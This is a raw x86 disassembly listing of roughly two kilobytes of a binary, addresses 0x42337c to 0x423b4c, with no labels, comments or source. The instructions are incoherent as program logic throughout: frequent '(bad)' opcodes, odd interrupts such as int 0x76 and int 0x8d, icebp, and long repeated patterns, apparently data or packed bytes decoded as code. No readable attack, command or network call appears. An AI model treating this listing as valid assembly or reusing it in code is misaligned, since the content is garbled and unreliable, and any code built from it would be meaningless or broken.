  42337c:	inc    ebx
  42337d:	rol    DWORD PTR [edx-0x2893219],cl
  423383:	or     dh,BYTE PTR [esi-0x53]
  423386:	int    0x76
  423388:	jne    0x423394
  42338a:	jbe    0x42335c
  42338c:	ret    
  42338d:	dec    ecx
  42338e:	and    DWORD PTR [esi+0x45e60a35],eax
  423394:	leave  
  423395:	jbe    0x423334
  423397:	inc    ecx
  423398:	and    DWORD PTR [esi+0x4576cd35],eax
  42339e:	int    0x8d
  4233a0:	inc    ebp
  4233a1:	cmp    eax,ebp
  4233a3:	cmp    ecx,DWORD PTR [edi]
  4233a5:	sar    DWORD PTR [ebp+0x28f2d392],cl
  4233ab:	push   ebx
  4233ac:	ror    DWORD PTR [edx],cl
  4233ae:	jbe    0x423405
  4233b0:	int    0x76
  4233b2:	inc    ebp
  4233b3:	int    0x8d
  4233b5:	inc    ebp
  4233b6:	cmp    eax,ebp
  4233b8:	cmp    ecx,DWORD PTR [edi]
  4233ba:	sar    DWORD PTR [ebp+0x28f2d392],cl
  4233c0:	push   ebx
  4233c1:	ror    DWORD PTR [edx],cl
  4233c3:	jbe    0x42335a
  4233c5:	leave  
  4233c6:	jbe    0x423405
  4233c8:	dec    eax
  4233c9:	and    DWORD PTR [esi+0x1d76c935],eax
  4233cf:	ret    0x8621
  4233d2:	xor    eax,0xcd4576cd
  4233d7:	lea    eax,[ebp+0x3b]
  4233da:	lds    edi,FWORD PTR [ebx]
  4233dc:	psrlq  mm6,mm2
  4233df:	sub    bl,dl
  4233e1:	mov    ebp,0xcdd35392
  4233e6:	lea    ebp,[ebp+0x52f7d43]
  4233ec:	push   ss
  4233ed:	xchg   DWORD PTR [eax-0x6d241480],eax
  4233f3:	add    BYTE PTR [eax-0x32c27233],0x76
  4233fa:	cmp    eax,0x3b5596cd
  4233ff:	jns    0x42343c
  423401:	or     al,0xd3
  423403:	lods   eax,DWORD PTR ds:[esi]
  423404:	sub    bl,dl
  423406:	jmp    0x42339a
  423408:	push   ebx
  423409:	jge    0x4233d8
  42340b:	jbe    0x4233ba
  42340d:	xor    edx,edx
  42340f:	cmp    ebx,edx
  423411:	clc    
  423412:	add    cl,BYTE PTR [edx]
  423414:	jbe    0x4233ab
  423416:	int    0x76
  423418:	sbb    eax,0x3b1d8dcd
  42341d:	lds    edi,FWORD PTR [ebx]
  42341f:	psrlq  mm6,mm2
  423422:	sub    bl,dl
  423424:	mov    ebp,0xcdd35392
  423429:	lea    edx,[ebp+0x16d87d43]
  42342f:	int    0x76
  423431:	sbb    eax,0x3b1d8dcd
  423436:	lds    edi,FWORD PTR [ebx]
  423438:	psrlq  mm7,QWORD PTR [ebp+0x28f2d392]
  42343f:	push   ebx
  423440:	ror    DWORD PTR [edx],cl
  423442:	jbe    0x4233d9
  423444:	int    0x76
  423446:	cmp    eax,0x3b3d8dcd
  42344b:	lds    edi,FWORD PTR [ebx]
  42344d:	psrlq  mm7,QWORD PTR [ebp+0x28f2d392]
  423454:	push   ebx
  423455:	ror    ebp,cl
  423457:	lea    edx,[ebp+0xad3d12f]
  42345d:	jbe    0x4233f4
  42345f:	int    0x76
  423461:	inc    ebp
  423462:	int    0x8d
  423464:	inc    ebp
  423465:	cmp    eax,ebp
  423467:	cmp    ecx,DWORD PTR [edi]
  423469:	shl    edx,cl
  42346b:	sub    bl,dl
  42346d:	mov    ebp,0xcdd35392
  423472:	lea    edx,[ebp+0x52f7d43]
  423478:	pusha  
  423479:	xchg   edx,eax
  42347a:	add    BYTE PTR [eax+0xa9576cd],0x76
  423481:	or     eax,0x875576cd
  423486:	jbe    0x423458
  423488:	or     ah,dh
  42348a:	xchg   ebp,eax
  42348b:	or     dh,BYTE PTR [esi+0x6d]
  42348e:	pop    ebp
  42348f:	inc    ecx
  423490:	and    DWORD PTR [esi+0x5d760a35],eax
  423496:	leave  
  423497:	jbe    0x4234ae
  423499:	cmp    DWORD PTR [ecx],esp
  42349b:	xchg   BYTE PTR ds:0xb23576c9,dh
  4234a1:	and    DWORD PTR [esi-0xe89f5cb],eax
  4234a7:	int    0x76
  4234a9:	xchg   ebp,eax
  4234aa:	int    0x8d
  4234ac:	xchg   ebp,eax
  4234ad:	cmp    eax,ebp
  4234af:	cmp    ecx,DWORD PTR [edi]
  4234b1:	sar    DWORD PTR [ebp+0x28f2d392],cl
  4234b7:	push   ebx
  4234b8:	ror    DWORD PTR [edx],cl
  4234ba:	jbe    0x423539
  4234bc:	int    0x6d
  4234be:	jmp    0x4234c6
  4234c0:	add    DWORD PTR [eax-0x36923280],0x7006
  4234ca:	add    BYTE PTR [ebx],cl
  4234cc:	and    DWORD PTR [esi-0x369232cb],eax
  4234d2:	push   es
  4234d3:	xchg   esp,eax
  4234d4:	add    BYTE PTR [eax],al
  4234d6:	add    bh,dh
  4234d8:	and    DWORD PTR [esi-0x329232cb],eax
  4234de:	ins    DWORD PTR es:[edi],dx
  4234df:	int    0x76
  4234e1:	icebp  
  4234e2:	int    0x8d
  4234e4:	icebp  
  4234e5:	cmp    eax,ebp
  4234e7:	cmp    ecx,DWORD PTR [edi]
  4234e9:	sar    DWORD PTR [ebp+0x28f2d392],cl
  4234ef:	push   ebx
  4234f0:	ror    ebp,cl
  4234f2:	lea    edi,[ebp+0x2f]
  4234f5:	rcl    ebx,1
  4234f7:	int    0x8d
  4234f9:	ins    DWORD PTR es:[edi],dx
  4234fa:	retf   0x8884
  4234fd:	or     DWORD PTR [esi-0x57],esi
  423500:	int    0x6d
  423502:	int    0x76
  423504:	icebp  
  423505:	int    0x8d
  423507:	icebp  
  423508:	cmp    ecx,DWORD PTR [edi]
  42350a:	cmp    eax,ebp
  42350c:	shl    edx,cl
  42350e:	sub    bl,dl
  423510:	mov    ebp,0xcdd35392
  423515:	lea    edi,[ebp+0x2f]
  423518:	rcl    ebx,1
  42351a:	int    0x8d
  42351c:	adc    eax,0x3b1596cd
  423521:	or     al,0x3b
  423523:	cdq    
  423524:	shr    ebx,cl
  423526:	xchg   edx,eax
  423527:	shr    edx,cl
  423529:	sub    BYTE PTR [ebx+0x13],dl
  42352c:	xchg   ebx,edx
  42352e:	int    0x8d
  423530:	ins    DWORD PTR es:[edi],dx
  423531:	das    
  423532:	pop    ecx
  423533:	dec    esp
  423534:	mov    ch,cl
  423536:	push   es
  423537:	jo     0x423539
  423539:	add    BYTE PTR [eax],al
  42353b:	int    0x17
  42353d:	jo     0x42353f
  42353f:	add    BYTE PTR [eax],al
  423541:	cmp    eax,ebp
  423543:	cmp    ebx,DWORD PTR [ecx-0x2c6d422d]
  423549:	jmp    0x2fd3:0x87d25328
  423550:	pop    ecx
  423551:	lea    ebp,[ecx-0x72f682c5]
  423557:	test   eax,0x76ca6dcd
  42355c:	test   eax,0xcdf18dcd
  423561:	xchg   esi,eax
  423562:	icebp  
  423563:	cmp    ecx,DWORD PTR [ebx+edi*1]
  423566:	cdq    
  423567:	shr    edx,cl
  423569:	sub    bl,dl
  42356b:	jmp    0x4234ff
  42356d:	push   ebx
  42356e:	adc    ecx,ebp
  423570:	xchg   esi,eax
  423571:	jge    0x4235a2
  423573:	rcl    DWORD PTR [ebx],1
  423575:	int    0x96
  423577:	ins    DWORD PTR es:[edi],dx
  423578:	or     DWORD PTR [ecx+esi*1+0x76cd6dcd],eax
  42357f:	icebp  
  423580:	int    0x8d
  423582:	icebp  
  423583:	cmp    eax,ebp
  423585:	cmp    ecx,DWORD PTR [edi]
  423587:	sar    DWORD PTR [ebp+0x28f2d392],cl
  42358d:	push   ebx
  42358e:	ror    ebp,cl
  423590:	lea    edi,[ebp+0x2f]
  423593:	rcl    ebx,1
  423595:	int    0x8d
  423597:	ins    DWORD PTR es:[edi],dx
  423598:	retf   0x8884
  42359b:	or     DWORD PTR [esi-0x57],esi
  42359e:	int    0x6d
  4235a0:	int    0x76
  4235a2:	icebp  
  4235a3:	int    0x8d
  4235a5:	icebp  
  4235a6:	cmp    eax,ebp
  4235a8:	sar    DWORD PTR [ebp-0x2cf0c46e],cl
  4235ae:	repnz sub BYTE PTR [ebx-0x2d],dl
  4235b2:	int    0x8d
  4235b4:	jge    0x4235e5
  4235b6:	rcl    ebx,1
  4235b8:	int    0x8d
  4235ba:	pop    ebp
  4235bb:	int    0x96
  4235bd:	pop    ebp
  4235be:	cmp    ecx,DWORD PTR [ebx+edi*1]
  4235c1:	cdq    
  4235c2:	shr    ebx,cl
  4235c4:	xchg   edx,eax
  4235c5:	shr    edx,cl
  4235c7:	sub    BYTE PTR [ebx+0x13],dl
  4235ca:	xchg   ebx,edx
  4235cc:	int    0x8d
  4235ce:	ins    DWORD PTR es:[edi],dx
  4235cf:	das    
  4235d0:	pop    ecx
  4235d1:	dec    esp
  4235d2:	mov    ch,cl
  4235d4:	push   es
  4235d5:	xchg   esp,eax
  4235d6:	add    BYTE PTR [eax],al
  4235d8:	add    ch,cl
  4235da:	pop    ss
  4235db:	xchg   esp,eax
  4235dc:	add    BYTE PTR [eax],al
  4235de:	add    BYTE PTR [ebx],bh
  4235e0:	lds    edi,FWORD PTR [ebx]
  4235e2:	cdq    
  4235e3:	sar    DWORD PTR [ebp+0x28ead392],cl
  4235e9:	push   ebx
  4235ea:	rol    BYTE PTR [edi-0x72a6d02d],cl
  4235f0:	test   eax,0x8d097d3b
  4235f5:	test   eax,0x76ca6dcd
  4235fa:	test   eax,0xcdf18dcd
  4235ff:	xchg   esi,eax
  423600:	icebp  
  423601:	cmp    ecx,DWORD PTR [ebx+edi*1]
  423604:	cdq    
  423605:	shr    edx,cl
  423607:	sub    bl,dl
  423609:	jmp    0x42359d
  42360b:	push   ebx
  42360c:	adc    ecx,ebp
  42360e:	xchg   esi,eax
  42360f:	jge    0x423640
  423611:	rcl    DWORD PTR [ebx],1
  423613:	int    0x96
  423615:	ins    DWORD PTR es:[edi],dx
  423616:	or     DWORD PTR [ecx+esi*1+0x76cd6dcd],eax
  42361d:	xor    eax,0x3b358dcd
  423622:	(bad)  
  423624:	(bad)
  423627:	sub    bl,dl
  423629:	mov    ebp,0xcdd35392
  42362e:	lea    ebx,[ebp-0x33]
  423631:	xchg   esi,eax
  423632:	pop    ebp
  423633:	cmp    ecx,DWORD PTR [ebx+edi*1]
  423636:	cdq    
  423637:	shr    ebx,cl
  423639:	xchg   edx,eax
  42363a:	shr    edx,cl
  42363c:	sub    BYTE PTR [ebx+0x13],dl
  42363f:	das    
  423640:	rcl    ebx,1
  423642:	xchg   DWORD PTR [esi+0x7d],esi
  423645:	or     dh,BYTE PTR [esi+0x7d]
  423648:	int    0x76
  42364a:	jge    0x423619
  42364c:	lea    ecx,ds:0xb2f7d43
  423652:	(bad)  
  423653:	inc    DWORD PTR [eax]
  423655:	add    ch,cl
  423657:	jbe    0x4236b6
  423659:	int    0x8d
  42365b:	pop    ebp
  42365c:	cmp    ecx,DWORD PTR [edi]
  42365e:	shl    edx,cl
  423660:	sub    BYTE PTR [ebx],bh
  423662:	(bad)
  423665:	xchg   edx,eax
  423666:	push   ebx
  423667:	ror    ebp,cl
  423669:	lea    ecx,ds:0xcdd3d12f
  42366f:	lea    edx,[ebp-0x142cf3c5]
  423675:	xchg   edx,eax
  423676:	push   ebx
  423677:	ror    ebp,cl
  423679:	lea    edx,[ebp-0xd2cf0c5]
  42367f:	sub    BYTE PTR [ebx-0x2d],dl
  423682:	or     dh,BYTE PTR [esi+0x35]
  423685:	int    0x76
  423687:	popf   
  423688:	int    0x8d
  42368a:	popf   
  42368b:	cmp    ecx,DWORD PTR [edi]
  42368d:	shl    edx,cl
  42368f:	sub    BYTE PTR [ebx],bh
  423691:	(bad)
  423694:	xchg   edx,eax
  423695:	push   ebx
  423696:	ror    ebp,cl
  423698:	lea    ebx,[ebp+0x3b9d96cd]
  42369e:	or     al,0xd3
  4236a0:	jmp    0x423634
  4236a2:	cmp    ebx,DWORD PTR [ecx+0x5328ead3]
  4236a8:	adc    eax,DWORD PTR [edi+0x7d87358d]
  4236ae:	xchg   DWORD PTR [ebp+0x558d0a55],ecx
  4236b4:	in     al,dx
  4236b5:	sbb    al,0xcd
  4236b7:	jbe    0x423656
  4236b9:	int    0x8d
  4236bb:	popf   
  4236bc:	cmp    eax,ebp
  4236be:	cmp    ecx,DWORD PTR [edi]
  4236c0:	sar    DWORD PTR [ebp+0x28f2d392],cl
  4236c6:	push   ebx
  4236c7:	rol    DWORD PTR [edi+0x760a5576],cl
  4236cd:	push   ebp
  4236ce:	int    0x76
  4236d0:	popf   
  4236d1:	int    0x8d
  4236d3:	popf   
  4236d4:	cmp    eax,ebp
  4236d6:	sar    DWORD PTR [ebp-0x2cf0c46e],cl
  4236dc:	repnz sub BYTE PTR [ebx-0x2d],dl
  4236e0:	int    0x8d
  4236e2:	lods   eax,DWORD PTR ds:[esi]
  4236e3:	xor    edi,DWORD PTR [ebp-0x33]
  4236e6:	jbe    0x423685
  4236e8:	int    0x96
  4236ea:	popf   
  4236eb:	cmp    eax,ebp
  4236ed:	cmp    ebx,DWORD PTR [ecx-0x2cd7152d]
  4236f3:	mov    ebp,0xcdd25392
  4236f8:	xchg   esi,eax
  4236f9:	push   ebp
  4236fa:	das    
  4236fb:	rcl    edx,1
  4236fd:	inc    ebx
  4236fe:	shr    DWORD PTR [edi],cl
  423700:	pop    es
  423701:	adc    ebp,edi
  423703:	add    BYTE PTR [eax],al
  423705:	int    0x76
  423707:	stc    
  423708:	int    0x76
  42370a:	stc    
  42370b:	int    0x76
  42370d:	std    
  42370e:	or     dh,BYTE PTR [esi+0x35]
  423711:	int    0x76
  423713:	mov    ch,cl
  423715:	lea    esp,ds:0x3b2596cd
  42371b:	or     al,0xd3
  42371d:	jmp    0x4236b1
  42371f:	cmp    ebx,DWORD PTR [ecx-0x7eeefe33]
  423725:	add    BYTE PTR [eax+0x5328ead3],0x13
  42372c:	jno    0x4236fb
  42372e:	lea    esp,[ebp-0x33]
  423731:	xchg   esi,eax
  423732:	cmp    ecx,DWORD PTR gs:[ebx+edi*1]
  423736:	cdq    
  423737:	shr    ebx,cl
  423739:	xchg   edx,eax
  42373a:	shr    edx,cl
  42373c:	sub    BYTE PTR [ebx+0x13],dl
  42373f:	jno    0x42370e
  423741:	(bad)  
  423742:	stc    
  423743:	int    0x96
  423745:	stc    
  423746:	add    dh,dl
  423748:	xor    eax,0x993b0c3b
  42374d:	shr    ebx,cl
  42374f:	xchg   edx,eax
  423750:	shr    edx,cl
  423752:	sub    BYTE PTR [ebx+0x13],dl
  423755:	jno    0x423757
  423757:	jo     0x42376d
  423759:	int    0x8d
  42375b:	stc    
  42375c:	int    0x96
  42375e:	stc    
  42375f:	cmp    ecx,DWORD PTR [ebx+edi*1]
  423762:	cdq    
  423763:	shr    ebx,cl
  423765:	xchg   edx,eax
  423766:	shr    edx,cl
  423768:	sub    BYTE PTR [ebx+0x13],dl
  42376b:	or     dh,BYTE PTR [esi+0x65]
  42376e:	inc    ebx
  42376f:	jge    0x4237a0
  423771:	add    eax,0x808080ab
  423776:	int    0x76
  423778:	stc    
  423779:	in     al,dx
  42377a:	(bad)  
  42377b:	int    0x96
  42377d:	or     dh,BYTE PTR gs:[esi-0x53]
  423781:	push   ecx
  423782:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423783:	lods   eax,DWORD PTR ds:[esi]
  423784:	int    0x8d
  423786:	lods   eax,DWORD PTR ds:[esi]
  423787:	shr    ebx,cl
  423789:	xchg   edx,eax
  42378a:	cmp    edi,DWORD PTR [ecx-0x2d]
  42378d:	lods   eax,DWORD PTR ds:[esi]
  42378e:	sub    BYTE PTR [ebx-0x2d],dl
  423791:	int    0x8d
  423793:	jne    0x42375f
  423795:	dec    esp
  423796:	or     DWORD PTR [ecx],0x8dcd304c
  42379c:	mov    ch,0xcd
  42379e:	lea    esi,[ebp+0x3bb596cd]
  4237a4:	or     al,0x3b
  4237a6:	cdq    
  4237a7:	shr    edx,cl
  4237a9:	sub    bl,dl
  4237ab:	jmp    0x42373f
  4237ad:	push   ebx
  4237ae:	adc    ecx,ebp
  4237b0:	xchg   esi,eax
  4237b1:	mov    ch,0x87
  4237b3:	jge    0x423782
  4237b5:	jbe    0x423764
  4237b7:	cmp    edx,ebp
  4237b9:	add    al,0xad
  4237bb:	std    
  4237bc:	add    al,0xea
  4237be:	std    
  4237bf:	shr    ebx,cl
  4237c1:	sub    BYTE PTR [edi+0x3bd353d2],al
  4237c7:	leave  
  4237c8:	int    0x8d
  4237ca:	std    
  4237cb:	int    0x96
  4237cd:	std    
  4237ce:	shr    edx,cl
  4237d0:	xchg   edx,eax
  4237d1:	shr    ebx,cl
  4237d3:	sub    BYTE PTR [ebx-0x1d],dl
  4237d6:	cmp    ebx,ecx
  4237d8:	inc    ebx
  4237d9:	rcl    dh,cl
  4237db:	mov    ds:0xcd8876cd,eax
  4237e0:	lea    ebp,ds:0xcd2d96cd
  4237e6:	add    DWORD PTR [ecx],edx
  4237e8:	add    DWORD PTR [eax+0x3b0c3b80],0x92ebd399
  4237f2:	shr    edx,cl
  4237f4:	sub    BYTE PTR [ebx+0x13],dl
  4237f7:	jno    0x4237c6
  4237f9:	(bad)  
  4237fa:	stc    
  4237fb:	int    0x96
  4237fd:	stc    
  4237fe:	cmp    ecx,DWORD PTR [ebx+edi*1]
  423801:	cdq    
  423802:	shr    ebx,cl
  423804:	xchg   edx,eax
  423805:	shr    edx,cl
  423807:	sub    BYTE PTR [ebx+0x13],dl
  42380a:	jno    0x42380c
  42380c:	(bad)  
  42380d:	jne    0x42380f
  42380f:	jo     0x42382d
  423811:	int    0x76
  423813:	or     dh,BYTE PTR gs:[esi+0x75]
  423817:	int    0x76
  423819:	xor    eax,0xcdfd760a
  42381e:	jbe    0x42381d
  423820:	cmp    ecx,ebx
  423822:	add    al,0xbd
  423824:	test   ah,dl
  423826:	xor    ecx,ebp
  423828:	jbe    0x42389f
  42382a:	int    0x14
  42382c:	mov    ch,cl
  42382e:	jbe    0x4238a5
  423830:	int    0x84
  423832:	mov    BYTE PTR [ebx],bh
  423834:	jns    0x423871
  423836:	aad    0xd3
  423838:	lods   eax,DWORD PTR ds:[esi]
  423839:	sub    bl,dl
  42383b:	repz xchg edx,eax
  42383d:	push   ebx
  42383e:	ror    ch,cl
  423840:	xchg   esi,eax
  423841:	jne    0x42384d
  423843:	test   BYTE PTR [edx-0x33],cl
  423846:	jbe    0x423845
  423848:	add    al,0xd3
  42384a:	test   BYTE PTR [edi*4-0x7d82bc7c],al
  423851:	xlat   BYTE PTR ds:[ebx]
  423852:	int    0x76
  423854:	std    
  423855:	cmp    ecx,ebx
  423857:	add    al,0xbd
  423859:	test   ah,dl
  42385b:	xor    ecx,ebp
  42385d:	jbe    0x4238d4
  42385f:	int    0x14
  423861:	mov    ch,cl
  423863:	jbe    0x4238da
  423865:	int    0x84
  423867:	mov    BYTE PTR [ebx],bh
  423869:	jns    0x4238a6
  42386b:	aad    0xd3
  42386d:	lods   eax,DWORD PTR ds:[esi]
  42386e:	sub    bl,dl
  423870:	repz xchg edx,eax
  423872:	push   ebx
  423873:	ror    ch,cl
  423875:	xchg   esi,eax
  423876:	jne    0x423882
  423878:	test   BYTE PTR [edx-0x33],cl
  42387b:	jbe    0x42387a
  42387d:	add    al,0xd3
  42387f:	test   BYTE PTR [edi*4-0x7d82bc7c],al
  423886:	xlat   BYTE PTR ds:[ebx]
  423887:	int    0x76
  423889:	jne    0x423895
  42388b:	jbe    0x42389a
  42388d:	int    0x76
  42388f:	mov    ch,0xcd
  423891:	lea    esi,[ebp+0xf3bc53b]
  423897:	shl    edx,cl
  423899:	sub    bl,dl
  42389b:	mov    ebp,0xcdd35392
  4238a0:	(bad)  
  4238a1:	stc    
  4238a2:	or     dh,BYTE PTR [esi+0x25]
  4238a5:	leave  
  4238a6:	jbe    0x423874
  4238a8:	imul   edi,DWORD PTR [ecx+0x69],0xb076c9d7
  4238af:	imul   edx,ebp,0x8d0a0c69
  4238b5:	gs adc bh,dl
  4238b8:	into   
  4238b9:	and    DWORD PTR [esi-0x32fad0cb],eax
  4238bf:	add    BYTE PTR [eax+0xd96cd80],0xcd
  4238c6:	sar    DWORD PTR [ebx],cl
  4238c8:	lds    ecx,FWORD PTR [edx]
  4238ca:	jbe    0x423879
  4238cc:	rol    esi,cl
  4238ce:	lods   eax,DWORD PTR ds:[esi]
  4238cf:	xchg   edx,eax
  4238d0:	or     dh,BYTE PTR [esi-0x30]
  4238d3:	int    0xd3
  4238d5:	cmp    edi,DWORD PTR [ecx-0x2d]
  4238d8:	lods   eax,DWORD PTR ds:[esi]
  4238d9:	sub    BYTE PTR [ebx+0x76],dl
  4238dc:	lods   eax,DWORD PTR ds:[esi]
  4238dd:	retf   0x858c
  4238e0:	int3   
  4238e1:	das    
  4238e2:	imul   eax,DWORD PTR [eax+esi*1+0x1830201],0x592fbeeb
  4238ed:	retf   
  4238ee:	inc    ebx
  4238ef:	rcl    esi,cl
  4238f1:	jle    0x4238c0
  4238f3:	jbe    0x4238aa
  4238f5:	int    0x8d
  4238f7:	mov    ch,0xcd
  4238f9:	jbe    0x4238b0
  4238fb:	int    0x96
  4238fd:	mov    ch,0x3b
  4238ff:	jns    0x42393c
  423901:	or     al,0xd3
  423903:	lods   eax,DWORD PTR ds:[esi]
  423904:	sub    bl,dl
  423906:	jmp    0x42389a
  423908:	push   ebx
  423909:	jge    0x4238d8
  42390b:	jbe    0x423972
  42390d:	cmp    edi,DWORD PTR [ecx-0x2d]
  423910:	lods   eax,DWORD PTR ds:[esi]
  423911:	sub    BYTE PTR [ebx+0x76],dl
  423914:	lods   eax,DWORD PTR ds:[esi]
  423915:	cmp    edx,ebp
  423917:	xchg   DWORD PTR [ebp-0x33],edi
  42391a:	jbe    0x4238ec
  42391c:	add    al,0xea
  42391e:	std    
  42391f:	add    al,0xad
  423921:	std    
  423922:	shr    ebx,cl
  423924:	sub    BYTE PTR [edi+0x3b1353f1],al
  42392a:	lock or cl,BYTE PTR [ebp-0x3105ed9b]
  423931:	and    DWORD PTR [esi-0x323329cb],eax
  423937:	jbe    0x42395e
  423939:	in     al,dx
  42393a:	and    cl,ch
  42393c:	jbe    0x423937
  42393e:	int    0x8d
  423940:	stc    
  423941:	cmp    eax,ebp
  423943:	cmp    ecx,DWORD PTR [edi]
  423945:	sar    DWORD PTR [ebp+0x28f2d392],cl
  42394b:	push   ebx
  42394c:	ror    ebp,cl
  42394e:	(bad)  
  42394f:	stc    
  423950:	int    0x96
  423952:	stc    
  423953:	cmp    ecx,DWORD PTR [ebx+edi*1]
  423956:	cdq    
  423957:	shr    ebx,cl
  423959:	xchg   edx,eax
  42395a:	shr    edx,cl
  42395c:	sub    BYTE PTR [ebx+0x13],dl
  42395f:	inc    ebx
  423960:	jge    0x423991
  423962:	add    eax,0x80809223
  423967:	int    0x76
  423969:	or     eax,0xa886ccd
  42396e:	out    0xb5,al
  423970:	leave  
  423971:	jbe    0x423998
  423973:	mov    dl,0x21
  423975:	xchg   BYTE PTR ds:0x393576c9,dh
  42397b:	and    DWORD PTR [esi-0x6a8936cb],eax
  423981:	dec    ecx
  423982:	mov    al,ds:0x76c93586
  423987:	lods   eax,DWORD PTR ds:[esi]
  423988:	imul   esp,DWORD PTR [ecx],0x76c93586
  42398e:	and    ch,BYTE PTR gs:[ebx-0x7a]
  423992:	xor    eax,0xcd3d760a
  423997:	jbe    0x423921
  423999:	int    0x8d
  42399b:	lods   eax,DWORD PTR ds:[esi]
  42399c:	int    0x96
  42399e:	lods   eax,DWORD PTR ds:[esi]
  42399f:	cmp    ecx,DWORD PTR [ebx+edx*8]
  4239a2:	jmp    0x423936
  4239a4:	cmp    ebx,DWORD PTR [ecx+0x5328ead3]
  4239aa:	adc    esi,DWORD PTR [ecx-0x33]
  4239ad:	lea    edx,[ebp+0x3b9596cd]
  4239b3:	or     al,0xd3
  4239b5:	jmp    0x423949
  4239b7:	cmp    ebx,DWORD PTR [ecx-0x7eeefe33]
  4239bd:	add    BYTE PTR [eax+0x5328ead3],0x13
  4239c4:	jno    0x423993
  4239c6:	lea    esp,[ebp-0x33]
  4239c9:	xchg   esi,eax
  4239ca:	cmp    ecx,DWORD PTR gs:[ebx+edi*1]
  4239ce:	cdq    
  4239cf:	shr    ebx,cl
  4239d1:	xchg   edx,eax
  4239d2:	shr    edx,cl
  4239d4:	sub    BYTE PTR [ebx+0x13],dl
  4239d7:	jno    0x4239a6
  4239d9:	lea    esi,[ebp+0x3bb596cd]
  4239df:	or     al,0x3b
  4239e1:	cdq    
  4239e2:	shr    ebx,cl
  4239e4:	xchg   edx,eax
  4239e5:	shr    edx,cl
  4239e7:	sub    BYTE PTR [ebx+0x13],dl
  4239ea:	jno    0x4239ec
  4239ec:	jo     0x423a02
  4239ee:	or     dh,BYTE PTR [esi+0x65]
  4239f1:	int    0x76
  4239f3:	mov    ch,cl
  4239f5:	lea    ebp,[ebp+0x3bad96cd]
  4239fb:	or     al,0xd3
  4239fd:	jmp    0x423991
  4239ff:	cmp    ebx,DWORD PTR [ecx-0x7eeefe33]
  423a05:	add    BYTE PTR [eax+0x5328ead3],0x13
  423a0c:	jno    0x4239db
  423a0e:	lea    edx,[ebp+0x3b9596cd]
  423a14:	or     al,0x3b
  423a16:	cdq    
  423a17:	shr    ebx,cl
  423a19:	xchg   edx,eax
  423a1a:	shr    edx,cl
  423a1c:	sub    BYTE PTR [ebx+0x13],dl
  423a1f:	jno    0x4239ee
  423a21:	lea    esi,[ebp+0xb596cd]
  423a27:	(bad)  
  423a28:	cmp    eax,0x993b0c3b
  423a2d:	shr    ebx,cl
  423a2f:	xchg   edx,eax
  423a30:	shr    edx,cl
  423a32:	sub    BYTE PTR [ebx+0x13],dl
  423a35:	jno    0x423a37
  423a37:	jo     0x423a4d
  423a39:	int    0x8d
  423a3b:	mov    ch,0xa
  423a3d:	jbe    0x4239ec
  423a3f:	int    0x76
  423a41:	mov    ch,0x3b
  423a43:	or     al,0x3b
  423a45:	jns    0x423a1a
  423a47:	jmp    0x4239db
  423a49:	shr    DWORD PTR [ebp-0x3282acd8],cl
  423a4f:	jbe    0x423ab6
  423a51:	inc    ebx
  423a52:	jge    0x423a83
  423a54:	add    eax,0x8080853c
  423a59:	int    0x8d
  423a5b:	mov    ch,0xcd
  423a5d:	xchg   esi,eax
  423a5e:	mov    ch,0x3b
  423a60:	or     al,0x3b
  423a62:	cdq    
  423a63:	shr    ebx,cl
  423a65:	xchg   edx,eax
  423a66:	shr    edx,cl
  423a68:	sub    BYTE PTR [ebx+0x13],dl
  423a6b:	inc    ebx
  423a6c:	lea    ebp,[ebp-0x7ab2fad1]
  423a72:	add    BYTE PTR [eax-0x32da7233],0x8d
  423a79:	and    eax,0x192ebd3
  423a7e:	add    ch,BYTE PTR [edi-0x723277f7]
  423a84:	mov    ch,0xcd
  423a86:	lea    esi,[ebp+0x192ebd3]
  423a8c:	add    ch,BYTE PTR [edi-0x327e83f7]
  423a92:	lea    esi,ds:0xd3358dcd
  423a98:	jmp    0x423a2c
  423a9a:	add    DWORD PTR [edx],eax
  423a9c:	scas   eax,DWORD PTR es:[edi]
  423a9d:	or     DWORD PTR [edx+edx*4+0x4],edi
  423aa1:	aaa    
  423aa2:	sbb    al,0x0
  423aa4:	add    BYTE PTR [eax],al
  423aa6:	add    BYTE PTR [edi+esi*1],0x24
  423aaa:	add    BYTE PTR [eax],al
  423aac:	add    BYTE PTR [eax+0x24cfcf],al
  423ab2:	add    BYTE PTR [eax],al
  423ab4:	jno    0x423ab6
  423ab6:	(bad)  
  423ab7:	cmp    eax,0x1ccfcf
  423abc:	add    BYTE PTR [eax],al
  423abe:	add    dh,dl
  423ac0:	lods   eax,DWORD PTR ds:[esi]
  423ac1:	jno    0x423a90
  423ac3:	lea    ecx,ds:0xcd4c9100
  423ac9:	lea    esi,[ebp+0x4]
  423acc:	shl    DWORD PTR [eax],cl
  423ace:	jno    0x423b40
  423ad0:	mov    ebp,0xefef
  423ad5:	or     dh,BYTE PTR [esi-0x30]
  423ad8:	int    0x76
  423ada:	mov    ch,cl
  423adc:	lea    ebp,ds:0xcd2d96cd
  423ae2:	add    DWORD PTR [ecx],edx
  423ae4:	add    DWORD PTR [eax+0x3b0c3b80],0x92ebd399
  423aee:	shr    edx,cl
  423af0:	sub    BYTE PTR [ebx+0x13],dl
  423af3:	jno    0x423ac2
  423af5:	lea    esi,[ebp+0x3bb596cd]
  423afb:	or     al,0x3b
  423afd:	cdq    
  423afe:	shr    ebx,cl
  423b00:	xchg   edx,eax
  423b01:	shr    edx,cl
  423b03:	sub    BYTE PTR [ebx+0x13],dl
  423b06:	jno    0x423b08
  423b08:	(bad)  
  423b09:	add    BYTE PTR gs:[eax+0x1c],dh
  423b0d:	int    0x76
  423b0f:	rcl    bl,1
  423b11:	ins    DWORD PTR es:[edi],dx
  423b12:	xchg   edx,eax
  423b13:	cmp    ecx,ecx
  423b15:	inc    ebx
  423b16:	leave  
  423b17:	int    0x76
  423b19:	mov    ch,cl
  423b1b:	lea    ebp,ds:0x811101cd
  423b21:	add    BYTE PTR [eax-0x29d26933],0x54
  423b28:	cmp    ecx,DWORD PTR [ebx+edi*1]
  423b2b:	cdq    
  423b2c:	shr    ebx,cl
  423b2e:	xchg   edx,eax
  423b2f:	shr    edx,cl
  423b31:	sub    BYTE PTR [ebx+0x13],dl
  423b34:	jno    0x423b03
  423b36:	lea    esi,[ebp+0x3bb596cd]
  423b3c:	or     al,0x3b
  423b3e:	cdq    
  423b3f:	shr    ebx,cl
  423b41:	xchg   edx,eax
  423b42:	shr    edx,cl
  423b44:	sub    BYTE PTR [ebx+0x13],dl
  423b47:	jno    0x423b49
  423b49:	(bad)  
  423b4a:	jne    0x423b4c
  423b4c:	jo     0x423b6a
